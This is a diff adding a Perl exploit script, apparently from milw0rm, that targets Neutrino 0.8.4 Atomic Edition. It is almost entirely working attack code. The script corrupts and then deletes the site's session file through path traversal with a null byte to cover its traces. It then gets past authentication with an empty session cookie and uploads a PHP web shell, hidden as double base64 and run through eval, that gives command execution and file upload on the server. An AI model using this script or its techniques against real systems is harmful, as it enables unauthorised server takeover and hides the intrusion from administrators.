@@ -1,0 +1,180 @@
+#!/usr/bin/perl
+#
+# Neutrino 0.8.4 Atomic Edition Perl exploit
+#
+# discovered & written by Ams
+# ax330d@gmail.com
+#
+# DESCRIPTION:
+# First exploit destroys "/data/sess.php" file (simply strips tags),
+# then we are able to bypass authorization and using admin privelegies
+# our exploit uploads basic shell to "/data/pages/shell_name" and deletes "/data/sess.php".
+# Admin will not see that "/data/sess.php" is deleted (it will be restored back in new auth).
+#
+# USAGE:
+# Run exploit :perl expl.pl http://www.site.com
+#
+# NEEDED:
+# regardless php.ini settings...
+#
+# GREETZ :P
+# Goes to... SLV, to he ( he knows who =)) and 
+# others whom do i know =)
+#
+
+use strict;
+use IO::Socket;
+
+print "\n\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	\n\t\t Neutrino 0.8.4 Atomic Edition exploit
+	\n\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n";
+
+if(@ARGV<1){
+	die "\n\tUsage:\texpl.pl [host]\n\n
+	\n\tExample:\texpl.pl http://localhost/blog/\n\n";
+}
+
+my $expl_url = $ARGV[0];
+my $shell = q~
+<?php
+$shell='YVhOelpYUW9KRjlRVDFOVVd5ZHdhSEJwYm1adkoxMHBQMlJwWlNod2FIQnBibVp2S0NrcE9qQTdDaVJsY2owbkp6c2t'.
+'jMjA5Snp4a2FYWWdZMnhoYzNNOUltNW1ieUkrU1c1bWJ6cGJjMkZtWlY5dGIyUmxQU2N1YVc1cFgyZGxkQ2duYzJGbVpWOXRiMl'.
+'JsSnlrdUoxMG1ibUp6Y0R0YloyeHZZbUZzY3owbkxtbHVhVjluWlhRb0ozSmxaMmx6ZEdWeVgyZHNiMkpoYkhNbktTNG5YU1p1W'.
+'W5Od08xdHRZV2RwWTE5eGRXOTBaWE5mWjNCalBTY3VhVzVwWDJkbGRDZ25iV0ZuYVdOZmNYVnZkR1Z6WDJkd1l5Y3BMaWRkSm01a'.
+'WMzQTdXMlJwYzJGaWJHVmtYMloxYm1OMGFXOXVjejBuTG1sdWFWOW5aWFFvSjJScGMyRmliR1ZrWDJaMWJtTjBhVzl1Y3ljcExpZ'.
+'GRKbTVpYzNBN1BHSnlMejViY0dod09pY3VjR2h3ZG1WeWMybHZiaWdwTGlkZEptNWljM0E3VzNWelpYSTZKeTVuWlhSZlkzVnljb'.
+'VZ1ZEY5MWMyVnlLQ2t1SjEwbWJtSnpjRHM4WW5JdlBsdDFibUZ0WlRvbkxuQm9jRjkxYm1GdFpTZ3BMaWRkSm01aWMzQTdQQzlrYV'.
+'hZK1BHSnlMejRuT3dwcFppaHBjM05sZENna1gxQlBVMVJiSjNObGRDZGRLU2w3YVdZb2FYTnpaWFFvSkY5R1NVeEZVMXNuWm1rblh'.
+'Ta3BJR2xtS0NGQWJXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUmZSa2xNUlZOYkoyWnBKMTFiSjNSdGNGOXVZVzFsSjEwc0pGOUdTV'.
+'XhGVTFzblpta25YVnNuYm1GdFpTZGRLU2tnSkhOdExqMG5QSE53WVc0Z1kyeGhjM005SW1WeWNtOXlJajVEYjNWc1pDQnViM1FnYlc'.
+'5MlpTQjFjR3h2WVdSbFpDQm1hV3hsSVR3dmMzQmhiajRuT3dwcFppaHBjM05sZENna1gxQlBVMVJiSjJWMllXd25YU2twZTI5aVgzT'.
+'jBZWEowS0NrN1pYWmhiQ2drWDFCUFUxUmJKMlYyWVd3blhTazdKSE50TGoxdllsOW5aWFJmWTJ4bFlXNG9LVHQ5Q21semMyVjBLQ1J'.
+'mVUU5VFZGc25aWGhsWXlkZEtUOGtjMjB1UFNjOGNISmxQaWN1WUNSZlVFOVRWRnRsZUdWalhXQXVKend2Y0hKbFBpYzZNRHQ5Q21Wa'.
+'mFHOGdKenhvZEcxc1BqeG9aV0ZrUGp4MGFYUnNaVDR1TGk1MFpXMXdiM0poY25rZ2MyaGxiR3d1TGk0OEwzUnBkR3hsUGp4dFpYUmhJ'.
+'R2gwZEhBdFpYRjFhWFk5SWtOdmJuUmxiblF0Vkhsd1pTSWdZMjl1ZEdWdWREMGlkR1Y0ZEM5b2RHMXNPeUJqYUdGeWMyVjBQWGRwYm1'.
+'SdmQzTXRNVEkxTVNJdlBnbzhjM1I1YkdVZ2RIbHdaVDBpZEdWNGRDOWpjM01pUGdwaWIyUjVlMlp2Ym5RdFptRnRhV3g1T25abGNtUmh'.
+'ibUVzWVhKcFlXd3NjMlZ5YVdZN1ltRmphMmR5YjNWdVpDMWpiMnh2Y2pvak16TXpPMk52Ykc5eU9pTm1PV1k1WmprN1ptOXVkQzF6YVh'.
+'wbE9qRXdjSGc3ZlFvdVltOTRlMkp2Y21SbGNqb3hjSGdnYzI5c2FXUWdJMk5qWXp0aVlXTnJaM0p2ZFc1a0xXTnZiRzl5T2lNek16TTd'.
+'iV0Z5WjJsdU9tRjFkRzg3YldGeVoybHVMWFJ2Y0RvME1IQjRPM0JoWkdScGJtYzZNVEJ3ZUR0M2FXUjBhRG8wTURCd2VEdDlDaTV1Wm0'.
+'5N1ltOXlaR1Z5T2pGd2VDQnpiMnhwWkNBak9UazVPMkpoWTJ0bmNtOTFibVF0WTI5c2IzSTZJelkyTmp0d1lXUmthVzVuT2pWd2VEdDl'.
+'DaTVqZTJOdmJHOXlPaU0wTkRRN1ptOXVkQzF6YVhwbE9qQXVOMlZ0TzMwS2FXNXdkWFI3YldGeVoybHVPakp3ZUR0OUNqd3ZjM1I1YkdV'.
+'K1BDOW9aV0ZrUGp4aWIyUjVQanhrYVhZZ1kyeGhjM005SW1KdmVDSStKeTRrYzIwdUp3bzhabTl5YlNCbGJtTjBlWEJsUFNKdGRXeDBhW'.
+'EJoY25RdlptOXliUzFrWVhSaElpQmhZM1JwYjI0OUlpSWdiV1YwYUc5a1BTSndiM04wSWo0S1BIQStQR2x1Y0hWMElIUjVjR1U5SW5OMV'.
+'ltMXBkQ0lnYm1GdFpUMGljR2h3YVc1bWJ5SWdkbUZzZFdVOUluQm9jR2x1Wm04aUx6NDhMM0ErQ25Wd2JHOWhaRG84YVc1d2RYUWdkSGx3'.
+'WlQwaVptbHNaU0lnYm1GdFpUMGlabWtpTHo0OFluSXZQZ3BqYldRNkptNWljM0E3UEdsdWNIVjBJSFI1Y0dVOUluUmxlSFFpSUc1aGJXVT'.
+'lJbVY0WldNaUlIWmhiSFZsUFNJaUx6NDhZbkl2UGdwbGRtRnNPaVp1WW5Od096eHBibkIxZENCMGVYQmxQU0owWlhoMElpQnVZVzFsUFNK'.
+'bGRtRnNJaUIyWVd4MVpUMGlJaTgrUEdKeUx6NDhjRDRLUEdsdWNIVjBJSFI1Y0dVOUluTjFZbTFwZENJZ2JtRnRaVDBpYzJWMElpQjJZV3'.
+'gxWlQwaVQyc2lMejQ4TDNBK0Nqd3ZabTl5YlQ0OFluSXZQanh6Y0dGdUlHTnNZWE56UFNKaklqNTBiWEFnYzJobGJHd2dZbmtnUVcxelBD'.
+'OXpjR0Z1UGp3dlpHbDJQand2WW05a2VUNDhMMmgwYld3K0p6cz0=';
+eval(base64_decode(base64_decode($shell)));
+?>
+~;
+my $shell_name = 'eof.php'; # or any desired
+
+print "\n\t[~] Starting exploit...\n";
+
+if($expl_url =~ m#http://#){
+	exploit($expl_url);
+} else {
+	exploit('http://'.$expl_url);
+}
+
+sub exploit {
+	
+	#	Defining...
+	my $site = pop @_;
+	my ($a, $b, $c, @d) = split /\//,$site;
+	my $path = join('/',@d);
+	my $host = $c;
+	if($path) {$path = '/'.$path;}
+	my ($length, $packet, $config, $injection);
+	
+	#	Revealing /data/sess.php...
+	print "\n\t[~] Modifying '/data/sess.php'...";
+	$injection = "action=usb&mail=-|\\?|-&p=../sess.php%00";
+	$length = length($injection);
+	$packet = "POST $path/index.php HTTP/1.1\r\n";
+	$packet .= "Host: $host\r\n";
+	$packet .= "Connection: Close\r\n";
+	$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+	$packet .= "Content-Length: $length\r\n\r\n";
+	$packet .= "$injection";
+	if( ! send_surprise($host, $packet)){
+		die("\n\t[-] Unable to connect to http://$host\n\n");
+	}
+	sleep(1);
+
+	#	Let's cover up traces...
+	$injection = "action=del_pag&pg=../sess.php%00";
+	$length = length($injection);	
+	$packet = "POST $path/index.php HTTP/1.1\r\n";
+	$packet .= "Host: $host\r\n";
+	$packet .= "Connection: Close\r\n";
+	$packet .= "Cookie: sid= \r\n";
+	$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+	$packet .= "Content-Length: $length\r\n\r\n";
+	$packet .= "$injection";
+	print "\n\t[~] Covering up traces (deleting sess.php) ...";
+	if( ! send_surprise($host,$packet)) {
+		die("\n\t[-] Unable to connect to http://$host\n\n");
+	}
+	sleep(1);
+
+	#	Bypassing auth, creating shell, copying "/data/sess.php"...
+	print "\n\t[~] Bypassing auth, creating shell...";
+	$injection = "action=new_pag&title=$shell_name&text=$shell";
+	$length = length($injection);
+	$packet = "POST $path/index.php HTTP/1.1\r\n";
+	$packet .= "Host: $host\r\n";
+	$packet .= "Connection: close\r\n";
+	$packet .= "Cookie: sid= \r\n";
+	$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+	$packet .= "Content-Length: $length\r\n\r\n";
+	$packet .= $injection;
+	if( ! send_surprise($host,$packet)){
+		die("\n\t[-] Unable to connect to http://$host\n\n");
+	}
+	sleep(1);
+	
+	#	Finally check for shell
+	print "\n\t[~] Checking for shell...";
+	$packet = "POST $path/data/pages/$shell_name HTTP/1.1\r\n";
+	$packet .= "Host: $host\r\n";
+	$packet .= "Connection: Close\r\n\r\n";
+	if( ! (my $dat = send_surprise($host,$packet,1))){
+		die("\n\t[-] Unable to connect to http://$host (check for shell yourself in $path/data/pages/$shell_name)\n\n");
+	} else {
+		if ($dat =~ /200 OK/){
+			print "\n\t[+] Exploited! (check /data/pages/$shell_name)\n\n";
+		} else {
+			print "\n\t[-] Exploiting failed... (but still check /data/pages/$shell_name =))\n\n";
+		}
+	}
+}
+
+sub send_surprise(){
+		
+	my $dat = 1;
+	my ($host, $packet, $ret) = @_;
+	my $socket=IO::Socket::INET->new(
+		Proto=>"tcp",
+		PeerAddr=>$host,
+		PeerPort=>"80"
+	);
+	if( ! $socket){
+		return 0;
+	} else {
+		
+		print $socket $packet;
+		if($ret){
+			my $rcv;
+			while($rcv = <$socket>){
+			$dat .= $rcv;
+			}
+		}
+		close ($socket);
+		return $dat;
+	}
+}
+
+# milw0rm.com [2008-07-07]
